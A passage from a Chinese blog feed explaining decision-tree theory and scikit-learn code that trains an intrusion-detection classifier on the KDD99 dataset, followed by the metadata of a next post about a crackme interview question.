class="comment">#dataset=pd.read_csv('/Volumes/Transcend/学习资料/2018年创新项目/中期答辩报告/数据/kddcup.data_10_percent')</span></span><br><span class="line"><span class="attribute">dataset</span>=pd.read_csv('/Volumes/Transcend/学习资料/2018年创新项目/中期答辩报告/数据/kddcup.data')</span><br><span class="line">dataset.columns = [<span class="string">'duration'</span>, <span class="string">'protocol_type'</span>,<span class="string">'service'</span>, <span class="string">'flag'</span>, <span class="string">'src_bytes'</span>, <span class="string">'dst_bytes'</span>, <span class="string">'land'</span>,<span class="string">'wrong_fragment'</span>, <span class="string">'urgent'</span>,<span class="string">'hot'</span>,</span><br><span class="line">                   <span class="string">'num_failed_logins'</span>, <span class="string">'logged_in'</span>, <span class="string">'num_compromised'</span>, <span class="string">'root_shell'</span>, <span class="string">'su_attempted'</span>, <span class="string">'num_root'</span>, <span class="string">'num_file_creations'</span>, <span class="string">'num_shells'</span>, <span class="string">'num_access_files'</span>, <span class="string">'num_outbound_cmds'</span>,</span><br><span class="line">                   <span class="string">'is_host_login'</span>, <span class="string">'is_guest_login'</span>, <span class="string">'count'</span>, <span class="string">'srv_count'</span>, <span class="string">'serror_rate'</span>, <span class="string">'srv_serror_rate'</span>, <span class="string">'rerror_rate'</span>, <span class="string">'srv_rerror_rate'</span>, <span class="string">'same_srv_rate'</span>, <span class="string">'diff_srv_rate'</span>, <span class="string">'srv_diff_host_rate'</span>,</span><br><span class="line">                   <span class="string">'dst_host_count'</span>, <span class="string">'dst_host_srv_count'</span>, <span class="string">'dst_host_same_srv_rate'</span>, <span class="string">'dst_host_diff_srv_rate'</span>, <span class="string">'dst_host_same_src_port_rate'</span>, <span class="string">'dst_host_srv_diff_host_rate'</span>,</span><br><span class="line">                   <span class="string">'dst_host_serror_rate'</span>, <span class="string">'dst_host_srv_serror_rate'</span>, <span class="string">'dst_host_rerror_rate'</span>, <span class="string">'dst_host_srv_rerror_rate'</span>, <span class="string">'type'</span>]  # 特征值命名</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(dataset.head())</span></span><br><span class="line">def trans_multi(type):  # 异常攻击归为一类</span><br><span class="line">    <span class="keyword">if</span> type!=<span class="string">'normal.'</span>:</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'attack.'</span></span><br><span class="line">    return type</span><br><span class="line"></span><br><span class="line">dataset[<span class="string">'type'</span>]=dataset[<span class="string">'type'</span>].apply(trans_multi)    #提取并修改type为标签的列</span><br><span class="line"></span><br><span class="line">x = dataset[[<span class="string">'count'</span>,<span class="string">'srv_serror_rate'</span>,<span class="string">'srv_count'</span>,<span class="string">'same_srv_rate'</span>,<span class="string">'dst_host_same_src_port_rate'</span>,<span class="string">'dst_host_srv_rerror_rate'</span>,<span class="string">'dst_host_srv_count'</span>,<span class="string">'dst_host_count'</span>,<span class="string">'logged_in'</span>,<span class="string">'protocol_type'</span>]]  # # 筛选出的用于预测的feature 通过最大熵原理进行特征选择</span><br><span class="line">y = dataset[<span class="string">'type'</span>] #把标签和前面的特征分开<span class="string">','</span>x作为特征<span class="string">','</span>y作为相应的标签</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(x.shape)  #(494020, 10)数据量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.数据预处理：训练集测试集分割，数据标准化</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(x, y, test_size = 0.3, random_state = 0)</span><br><span class="line"><span class="comment">#x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.25,random_state=33)  # 将数据进行分割</span></span><br><span class="line"></span><br><span class="line">vec = DictVectorizer(<span class="attribute">sparse</span>=<span class="literal">False</span>)</span><br><span class="line">x_train = vec.fit_transform(x_train.to_dict(<span class="attribute">orient</span>=<span class="string">'record'</span>))   #对训练数据的特征进行提取</span><br><span class="line">x_test = vec.transform(x_test.to_dict(<span class="attribute">orient</span>=<span class="string">'record'</span>))         #对测试数据的特征进行提取</span><br><span class="line"></span><br><span class="line"><span class="comment">#转换特征后，凡是类别型型的特征都单独独成剥离出来，独成一列特征，数值型的则不变</span></span><br><span class="line"><span class="builtin-name">print</span>(vec.feature_names_)  #[<span class="string">'count'</span>, <span class="string">'dst_host_count'</span>, <span class="string">'dst_host_same_src_port_rate'</span>, <span class="string">'dst_host_srv_count'</span>, <span class="string">'dst_host_srv_rerror_rate'</span>, <span class="string">'logged_in'</span>, <span class="string">'protocol_type=icmp'</span>, <span class="string">'protocol_type=tcp'</span>, <span class="string">'protocol_type=udp'</span>, <span class="string">'same_srv_rate'</span>, <span class="string">'srv_count'</span>, <span class="string">'srv_serror_rate'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.使用决策树对测试数据进行类别预测</span></span><br><span class="line">t0 = time.time()</span><br><span class="line">dtc = DecisionTreeClassifier(<span class="attribute">criterion</span>=<span class="string">"entropy"</span>, <span class="attribute">min_samples_split</span>=30, <span class="attribute">class_weight</span>=<span class="string">"balanced"</span>)    #设置决策树参数 剪枝参数</span><br><span class="line">dtc.fit(x_train,y_train)</span><br><span class="line">train_time = time.time() - t0   #训练时间</span><br><span class="line"></span><br><span class="line">t0 = time.time()</span><br><span class="line">y_predict = dtc.predict(x_test)</span><br><span class="line">test_time = time.time() - t0    #预测时间</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.获取结果报告</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'Accracy:'</span>,dtc.score(x_test,y_test))</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"Train_time:%.3fs"</span> %train_time)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"Test_time:%.3fs"</span> %test_time)</span><br><span class="line"><span class="builtin-name">print</span>(classification_report(y_predict,y_test,target_names=[<span class="string">'attcak.'</span>,<span class="string">'normal.'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.将生成的决策树保存</span></span><br><span class="line">with open(<span class="string">"/Volumes/Transcend/学习资料/2018年创新项目/中期答辩报告/数据/tree.dot"</span>, <span class="string">'w'</span>) as f:</span><br><span class="line">    f = tree.export_graphviz(dtc, <span class="attribute">out_file</span>=f,filled = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="0-1-代码参考"><a href="#0-1-代码参考" class="headerlink" title="0.1 代码参考"></a>0.1 代码参考</h2><p><a href="https://www.cnblogs.com/youngsea/p/9330229.html" target="_blank" rel="noopener">https://www.cnblogs.com/youngsea/p/9330229.html</a></p><h1 id="一-理论部分"><a href="#一-理论部分" class="headerlink" title="一. 理论部分"></a>一. 理论部分</h1><h2 id="1-1-决策树的构成划分"><a href="#1-1-决策树的构成划分" class="headerlink" title="1.1 决策树的构成划分"></a>1.1 决策树的构成划分</h2><h3 id="1-1-1-算法综述"><a href="#1-1-1-算法综述" class="headerlink" title="1.1.1 算法综述"></a>1.1.1 算法综述</h3><p>决策树的做法是每次选择一个属性进行判断，如果不能得出结论，继续选择其他属性进行判断，直到能够“肯定地”判断出用户的类型或者是上述属性都已经使用完毕</p><p>子节点的输出的结果为该节点数量占比最大的类别 也就是说 判断结果是 大部分是异常数据<br>并不能做到100%正确</p><p>决策树关键在于树的构建:</p><ol><li>数据如何分割</li><li>如何选择分裂的属性</li><li>什么时候停止分裂</li></ol><h3 id="1-1-2-数据分割"><a href="#1-1-2-数据分割" class="headerlink" title="1.1.2 数据分割"></a>1.1.2 数据分割</h3><p>分裂属性的数据类型分为离散型和连续性两种情况:</p><ol><li>对于离散型的数据，按照属性值进行分裂，每个属性值对应一个分裂节点</li><li>对于连续性属性，一般性的做法是对数据按照该属性进行排序，再将数据分成若干区间，如<code>[0,10]、[10,20]、[20,30]…</code>，一个区间对应一个节点，若数据的属性值落入某一区间则该数据就属于其对应的节点。</li></ol><h3 id="1-1-3-分裂属性的选择"><a href="#1-1-3-分裂属性的选择" class="headerlink" title="1.1.3 分裂属性的选择"></a>1.1.3 分裂属性的选择</h3><p>即当前节点选择用哪个属性去进一步区分数据集<br><br>选择分裂属性是要找出能够使所有孩子节点数据最纯的属性，决策树使用<strong>信息增益</strong>或者<strong>信息增益率</strong>作为选择属性的依据<br><br>即 分裂后 两个子节点差距较大</p><ul><li>信息增率(ID3)<br>分裂前的数据复杂度<strong>(熵或者基尼值)</strong>减去孩子节点的数据复杂度的和，信息增益越大，分裂后的复杂度减小得越多，分类的效果越明显 信息增益表示得知特征XX的信息而使得类YY的信息不确定性减少的程度<img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/正确的信息增益.png" alt></li><li><p>信息增益率(C4.5)<br>信息增益率是在信息增益的基础上除以分裂节点数据量的信息增益<br>避免 倾向选择分支比较多的属性进行分裂<br><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/信息增益率.png" alt></p></li><li><p><strong>熵(ID3/C4.5)</strong> 以二分类问题为例(CART 只能构造二叉树)，如果两类的数量相同，此时分类节点的纯度最低，熵等于1；如果节点的数据属于同一类时，此时节点的纯度最高，熵 等于0。<img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/信息熵.png" alt></p></li><li><strong>条件熵H（Y|X）</strong>表示在已知随机变量X的条件下随机变量Y的不确定性。随机变量X给定的条件下随机变量Y的条件熵H(Y|X)<img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/条件熵.png" alt></li><li><strong>基尼值(CART)</strong> 其同样以上述熵的二分类例子为例，当两类数量相等时，基尼值等于0.5 ；当节点数据属于同一类时，基尼值等于0 。基尼值越大，数据越不纯</li></ul><h3 id="1-1-4-停止分裂的条件"><a href="#1-1-4-停止分裂的条件" class="headerlink" title="1.1.4 停止分裂的条件"></a>1.1.4 停止分裂的条件</h3><ol><li>最小节点 节点数据量小于某个标准</li><li>复杂度 即节点数据够纯</li><li>属性用完</li><li>决策树的深度达到指定的条件 </li></ol><p>根据决策树的输出结果，决策树可以分为分类树和回归树，分类树输出的结果为具体的类别(是否为异常数据)，而回归树输出的结果为一个确定的数值<br><br>决策树的构建算法主要有ID3、C4.5、CART三种，其中ID3和C4.5是分类树，CART是分类回归树<br><br>其中ID3是决策树最基本的构建算法，而C4.5和CART是在ID3的基础上进行优化的算法</p><h2 id="1-2-ID3-C4-5"><a href="#1-2-ID3-C4-5" class="headerlink" title="1.2 ID3/C4.5"></a>1.2 ID3/C4.5</h2><p>划分数据集的最大原则是：使无序的数据变的有序。如果一个训练数据中有20个特征，那么选取哪个做划分依据？这就必须采用量化的方法来判断，量化划分方法有多重，其中一项就是“信息论度量信息分类”。基于信息论的决策树算法有ID3、CART和C4.5等算法，其中C4.5和CART两种算法从ID3算法中衍生而来</p><h3 id="1-2-1-ID3"><a href="#1-2-1-ID3" class="headerlink" title="1.2.1 ID3:"></a>1.2.1 ID3:</h3><ol><li>采用信息增益进行分裂，分裂的精确度可能没有采用信息增益率进行分裂高</li><li>不能处理连续型数据，只能通过离散化将连续性数据转化为离散型数据(对具体数据排列取区间)</li><li>不能处理缺省值</li><li>没有对决策树进行剪枝处理，很可能会出现过拟合的问题</li></ol><h3 id="1-2-2-C4-5"><a href="#1-2-2-C4-5" class="headerlink" title="1.2.2 C4.5:"></a>1.2.2 C4.5:</h3><p>与ID3不同点在于对连续数据的分割方案 和 对分割属性的选择使用 信息增益率<br><br>处理方式是先根据连续型属性进行排序，然后采用一刀切的方式将数据砍成两半。<br>计算每一个切割点切割后的信息增益，然后选择使分裂效果最优的切割点</p><p>选择了最优的分割点之后，再计算信息增益率跟其他的属性进行比较，确定最优的分裂属性</p><h2 id="1-3-Classification-and-Regression-Trees-CART"><a href="#1-3-Classification-and-Regression-Trees-CART" class="headerlink" title="1.3 Classification and Regression Trees(CART)"></a>1.3 Classification and Regression Trees(CART)</h2><h3 id="1-3-1-CART"><a href="#1-3-1-CART" class="headerlink" title="1.3.1 CART:"></a>1.3.1 CART:</h3><p>CART，又名分类回归树，是在ID3的基础上进行优化的决策树</p><ol><li>CART既能是分类树(最后的输出是数据的分类 例如预测人有没有孩子)，又能是回归树(最后的输出是具体的数值 例如预测明天的气温 节点数据的平均值)；(本项目只考虑分类树的作用)</li><li>当CART是分类树时，<strong>采用GINI值作为节点分裂的依据</strong>；当CART是回归树时，采用样本的最小方差作为节点分裂的依据 (回归树不作要求)</li><li>CART是一棵二叉树。(判断是否是异常数据即可)</li></ol><h3 id="1-3-2-数据分割"><a href="#1-3-2-数据分割" class="headerlink" title="1.3.2 数据分割"></a>1.3.2 数据分割</h3><ul><li>连续型 <br>和C4.5相同 通过最小化分裂后的GINI值或者样本方差寻找最优分割点，将节点一分为二</li><li>离散型 <br> 因为只能分成二叉树 方案和处理连续型的差不多 对每个切割点(分组方案)进行GINI值计算 最后分成两组</li></ul><p><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/GINI.png" alt></p><h3 id="1-3-3-后剪枝"><a href="#1-3-3-后剪枝" class="headerlink" title="1.3.3 后剪枝"></a>1.3.3 后剪枝</h3><p>CART采用CCP（代价复杂度）剪枝方法。代价复杂度选择节点表面误差率增益值最小的非叶子节点，删除该非叶子节点的左右子节点，若有多个非叶子节点的表面误差率增益值相同小，则选择非叶子节点中子节点数最多的非叶子节点进行剪枝<br><br></p><p>r(t)节点错误率(占比小的/节点数据量)<br><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/cpp剪枝1.png" alt><br><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/cpp剪枝2.png" alt></p><h1 id="二-代码实践"><a href="#二-代码实践" class="headerlink" title="二. 代码实践"></a>二. 代码实践</h1><p>使用 10%的KDD99训练数据来进行前期的模型训练和预测</p><h2 id="2-1-数据预处理"><a href="#2-1-数据预处理" class="headerlink" title="2.1 数据预处理"></a>2.1 数据预处理</h2><h3 id="2-1-1-导入数据"><a href="#2-1-1-导入数据" class="headerlink" title="2.1.1 导入数据"></a>2.1.1 导入数据</h3><p>导入数据进入pandas,并赋予每项特征值标签名</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dataset=pd.read_csv('kddcup.data_10_percent')</span></span><br><span class="line"><span class="attr">dataset</span>=pd.read_csv(<span class="string">'kddcup.data'</span>)</span><br><span class="line"><span class="attr">dataset.columns</span> = [<span class="string">'duration'</span>, <span class="string">'protocol_type'</span>,<span class="string">'service'</span>, <span class="string">'flag'</span>, <span class="string">'src_bytes'</span>, <span class="string">'dst_bytes'</span>, <span class="string">'land'</span>,<span class="string">'wrong_fragment'</span>, <span class="string">'urgent'</span>,<span class="string">'hot'</span>,</span><br><span class="line">                   <span class="string">'num_failed_logins'</span>, <span class="string">'logged_in'</span>, <span class="string">'num_compromised'</span>, <span class="string">'root_shell'</span>, <span class="string">'su_attempted'</span>, <span class="string">'num_root'</span>, <span class="string">'num_file_creations'</span>, <span class="string">'num_shells'</span>, <span class="string">'num_access_files'</span>, <span class="string">'num_outbound_cmds'</span>,</span><br><span class="line">                   <span class="string">'is_host_login'</span>, <span class="string">'is_guest_login'</span>, <span class="string">'count'</span>, <span class="string">'srv_count'</span>, <span class="string">'serror_rate'</span>, <span class="string">'srv_serror_rate'</span>, <span class="string">'rerror_rate'</span>, <span class="string">'srv_rerror_rate'</span>, <span class="string">'same_srv_rate'</span>, <span class="string">'diff_srv_rate'</span>, <span class="string">'srv_diff_host_rate'</span>,</span><br><span class="line">                   <span class="string">'dst_host_count'</span>, <span class="string">'dst_host_srv_count'</span>, <span class="string">'dst_host_same_srv_rate'</span>, <span class="string">'dst_host_diff_srv_rate'</span>, <span class="string">'dst_host_same_src_port_rate'</span>, <span class="string">'dst_host_srv_diff_host_rate'</span>,</span><br><span class="line">                   <span class="string">'dst_host_serror_rate'</span>, <span class="string">'dst_host_srv_serror_rate'</span>, <span class="string">'dst_host_rerror_rate'</span>, <span class="string">'dst_host_srv_rerror_rate'</span>, <span class="string">'type'</span>]  <span class="comment"># 特征值命名</span></span><br></pre></td></tr></table></figure><h3 id="2-1-2-异常流量归一"><a href="#2-1-2-异常流量归一" class="headerlink" title="2.1.2 异常流量归一"></a>2.1.2 异常流量归一</h3><p>当前目标只需要区分正常流量和异常流量即可,修改类型不是normal的数据类型.选择用于训练预测的特征值,通过最大熵原理进行特征选择.</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans_multi</span></span>(<span class="class"><span class="keyword">type</span>)</span>:  # 异常攻击归为一类</span><br><span class="line">    <span class="keyword">if</span> <span class="class"><span class="keyword">type</span><span class="title">!=</span>'<span class="title">normal</span>.'</span>:</span><br><span class="line">        <span class="class"><span class="keyword">type</span></span>=<span class="symbol">'attack</span>.'</span><br><span class="line">    <span class="keyword">return</span> <span class="class"><span class="keyword">type</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">dataset</span>['type']<span class="title">=dataset</span>['type'].<span class="title">apply</span>(<span class="params">trans_multi</span>)    <span class="title">#提取并修改type为标签的列</span></span></span><br><span class="line"><span class="class"><span class="title">x</span> </span>= dataset[[<span class="symbol">'coun</span>t',<span class="symbol">'srv_serror_rat</span>e',<span class="symbol">'srv_coun</span>t',<span class="symbol">'same_srv_rat</span>e',<span class="symbol">'dst_host_same_src_port_rat</span>e',<span class="symbol">'dst_host_srv_rerror_rat</span>e',<span class="symbol">'dst_host_srv_coun</span>t',<span class="symbol">'dst_host_coun</span>t',<span class="symbol">'logged_i</span>n',<span class="symbol">'protocol_typ</span>e']]  # 筛选出的用于预测的feature 通过最大熵原理进行特征选择</span><br><span class="line">y = dataset[<span class="symbol">'typ</span>e'] #把标签和前面的特征分开',<span class="symbol">'x</span>作为特征',<span class="symbol">'y</span>作为相应的标签</span><br></pre></td></tr></table></figure><h3 id="2-1-3-特征选取"><a href="#2-1-3-特征选取" class="headerlink" title="2.1.3 特征选取"></a>2.1.3 特征选取</h3><p>一般的数据集的变量之间会出现一下几种情况：</p><ul><li>变量之间相关性太强，互相依赖严重，会导致有冗余变量</li><li>变量中的数据极其稀疏，很大部分都是0或者无意义</li><li>变量维度太高，经过重编码后变量维度达到了几百个</li></ul><p>以上三种情况都很不利对模型的训练，情况2种能通过设置阈值来过滤一些稀疏的变量；情况1和3能通过主成分分析（PCA）提取主要因子进行降维，除此之外，还有属性子集选择方法：通过删除不相关或者冗余的属性减少数据量，有逐步向前选择、逐步向后选择和决策树归纳三种</p><p>dataset变量一共有42个维度，高维度的数据集在决策树中的训练很容易出现过拟合的情况,对变量进行筛选，也就是feature selection,Scikit已经提供了基于树的属性子集选择方法，把数据输入ExtraTreesClassifier训练，然后用SelectFromModel提取训练的模型，最后使用transform方法筛选出重要的特征</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.ensemble <span class="built_in">import</span> ExtraTreesClassifier</span><br><span class="line">from sklearn.feature_selection <span class="built_in">import</span> SelectFromModel</span><br><span class="line"></span><br><span class="line"><span class="attr">data_set</span> = dataset[<span class="number">0</span>:(T_len - <span class="number">1</span>)]</span><br><span class="line"><span class="attr">data_target</span> = datatarget[<span class="number">0</span>:(T_len - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="attr">clf</span> = ExtraTreesClassifier()</span><br><span class="line"><span class="attr">clf</span> = clf.fit(data_set, data_target)</span><br><span class="line">print clf.feature_importances_</span><br><span class="line"></span><br><span class="line"><span class="attr">model</span> = SelectFromModel(clf, <span class="attr">prefit=True)</span></span><br><span class="line"><span class="attr">feature_set</span> = model.transform(data_set)</span><br><span class="line"></span><br><span class="line"><span class="attr">fea_index</span> = []</span><br><span class="line">for A_col <span class="keyword">in</span> np.arange(data_set.shape[<span class="number">1</span>]):</span><br><span class="line">    for B_col <span class="keyword">in</span> np.arange(feature_set.shape[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">if</span> (data_set[:, A_col] == feature_set[:, B_col]).all():</span><br><span class="line">            fea_index.append(A_col)</span><br></pre></td></tr></table></figure><p>最终选择其中十个特征值 </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'count','srv_serror_rate','srv_count','same_srv_rate','dst_host_same_src_port_rate','dst_host_srv_rerror_rate','dst_host_srv_count','dst_host_count','logged_in','protocol_type'</span><br></pre></td></tr></table></figure><h3 id="2-1-4-训练集测试集分割-数据标准化"><a href="#2-1-4-训练集测试集分割-数据标准化" class="headerlink" title="2.1.4 训练集测试集分割/数据标准化"></a>2.1.4 训练集测试集分割/数据标准化</h3><p>将数据集的后30%数据作为测试数据集,并对离散型的特征值通过DictVectorizer进行特征提取</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x_train, x_test, y_train, y_test = train_test_split(x, y, test_size = 0.3, random_state = 0)</span><br><span class="line"><span class="comment">#x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.25,random_state=33)  # 将数据进行分割</span></span><br><span class="line"></span><br><span class="line">vec = DictVectorizer(<span class="attribute">sparse</span>=<span class="literal">False</span>)</span><br><span class="line">x_train = vec.fit_transform(x_train.to_dict(<span class="attribute">orient</span>=<span class="string">'record'</span>))   #对训练数据的特征进行提取</span><br><span class="line">x_test = vec.transform(x_test.to_dict(<span class="attribute">orient</span>=<span class="string">'record'</span>))         #对测试数据的特征进行提取</span><br><span class="line"></span><br><span class="line"><span class="comment">#转换特征后，凡是类别型型的特征都单独剥离出来，独成一列特征，数值型的则不变</span></span><br><span class="line"><span class="builtin-name">print</span>(vec.feature_names_)  #[<span class="string">'count'</span>, <span class="string">'dst_host_count'</span>, <span class="string">'dst_host_same_src_port_rate'</span>, <span class="string">'dst_host_srv_count'</span>, <span class="string">'dst_host_srv_rerror_rate'</span>, <span class="string">'logged_in'</span>, <span class="string">'protocol_type=icmp'</span>, <span class="string">'protocol_type=tcp'</span>, <span class="string">'protocol_type=udp'</span>, <span class="string">'same_srv_rate'</span>, <span class="string">'srv_count'</span>, <span class="string">'srv_serror_rate'</span>]</span><br></pre></td></tr></table></figure><h2 id="2-2-模型训练评估"><a href="#2-2-模型训练评估" class="headerlink" title="2.2 模型训练评估"></a>2.2 模型训练评估</h2><p>Scikit提供了一种优化版本的CART算法,封装在DecisionTreeClassifier里,有一些主要的参数</p><ul><li>criterion：节点分裂的准则，gini or entropy</li><li>max_depth：树的最大深度，这个值过大会导致算法对训练集的过拟合，而过小的值会妨碍算法对数据的学习，初始值推荐为5，然后慢慢增大，观察树的形状</li><li>min_samples_split：需要被分裂成子节点的最小样本数，当样本数小于这个值时，就直接标记为叶节点而不用继续生成子节点，值越大，树的枝越少，达到一定的剪枝效果</li><li>class_weight：当输入的样本集类别数量相差很大时，树最后的形状会倾向朝大数据样本的方向生成，导致树的不平衡，因此可以设置各个类别的权重，数据量少的类权重大，数据量大的类权重小，能够有效地将树平衡</li></ul><h3 id="2-2-1-类别预测"><a href="#2-2-1-类别预测" class="headerlink" title="2.2.1 类别预测"></a>2.2.1 类别预测</h3><p>通过反复尝试，找到一组比较好的训练参数：用信息entropy来分裂各个节点；min_samples_split＝30；让所有训练样本充分平衡，即输入的各类元组数相等</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t0 = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">dtc = DecisionTreeClassifier(criterion=<span class="string">"entropy"</span>, min_samples_split=<span class="number">30</span>, class_weight=<span class="string">"balanced"</span>)    <span class="comment">#设置决策树参数 剪枝参数</span></span><br><span class="line">dtc.fit(x_train,y_train)</span><br><span class="line">train_time = <span class="built_in">time</span>.<span class="built_in">time</span>() - t0   <span class="comment">#训练时间</span></span><br><span class="line"></span><br><span class="line">t0 = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">y_predict = dtc.predict(x_test)</span><br><span class="line">test_time = <span class="built_in">time</span>.<span class="built_in">time</span>() - t0    <span class="comment">#预测时间</span></span><br></pre></td></tr></table></figure><h3 id="2-2-2-获取结果报告"><a href="#2-2-2-获取结果报告" class="headerlink" title="2.2.2 获取结果报告"></a>2.2.2 获取结果报告</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取结果报告</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'Accracy:'</span>,dtc.score(x_test,y_test))</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"Train_time:%.3fs"</span> %train_time)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"Test_time:%.3fs"</span> %test_time)</span><br><span class="line"><span class="builtin-name">print</span>(classification_report(y_predict,y_test,target_names=[<span class="string">'attcak.'</span>,<span class="string">'normal.'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将生成的决策树保存</span></span><br><span class="line">with open(<span class="string">"tree.dot"</span>, <span class="string">'w'</span>) as f:</span><br><span class="line">    f = tree.export_graphviz(dtc, <span class="attribute">out_file</span>=f,filled = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="2-3-测试结果"><a href="#2-3-测试结果" class="headerlink" title="2.3 测试结果"></a>2.3 测试结果</h2><h3 id="2-3-1-10-数据"><a href="#2-3-1-10-数据" class="headerlink" title="2.3.1 10%数据"></a>2.3.1 10%数据</h3><p><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/10-data.png" alt></p><h3 id="2-3-2-完整数据"><a href="#2-3-2-完整数据" class="headerlink" title="2.3.2 完整数据"></a>2.3.2 完整数据</h3><p><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/entire-data.png" alt></p><h3 id="2-3-3-决策树可视化模型"><a href="#2-3-3-决策树可视化模型" class="headerlink" title="2.3.3 决策树可视化模型"></a>2.3.3 决策树可视化模型</h3><p>利用graphvizdot 使用命令 <code>dot -Tpng tree.dot -o filename.png</code>生成可视化树模型</p><p>用颜色来表示节点纯度<br><img src="/2019/04/16/Machine-Learning-for-IDS-Decision-Tree代码详解/result.png" alt></p><h1 id="三-算法总结"><a href="#三-算法总结" class="headerlink" title="三. 算法总结"></a>三. 算法总结</h1><p>对比正确率和比svm高一点点<br>特别是在数据量非常大的时候 完整的测试数据测试正确率在0.999439<br><br>决策树最大的优势的点就是速度了 是四种算法里训练和测试速度最快的算法<br><br>训练完整的数据只需要27.734s<br><br>测试完整的数据只需要0.172s<br></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在中期答辩前 优化了一遍寒假弄的决策树代码&lt;br&gt;紧跟着队友的脚步改用了超级方便的pandas库来储存数据&lt;br&gt;修改了剪枝条件和特征值的分裂条件&lt;br&gt;优化了最后的结果显示 加上了训练时间和预测时间&lt;br&gt;在数据量非常大的时候 四百万+的数据量 测试正确率在0.999几&lt;br&gt;最有优势的点就是速度了 训练速度和预测速度是svm完全比不上的&lt;br&gt;看队友报告里写 完整跑完数据要六个小时&lt;br&gt;哈哈哈 我只要27秒&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Machine Learning" scheme="http://Ronpa.top/tags/Machine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全部门面试题-CrackXX.exe</title>
    <link href="http://ronpa.top/2019/03/26/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E9%83%A8%E9%97%A8%E9%9D%A2%E8%AF%95%E9%A2%98-CrackXX-exe/"/>
    <id>http://ronpa.top/2019/03/26/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E9%83%A8%E9%97%A8%E9%9D%A2%E8%AF%95%E9%A2%98-CrackXX-exe/</id>
    <published>2019-03-26T08:52:02.000Z</published>
    <updated>2021-01-25T19:20:27.566Z</updated>
    
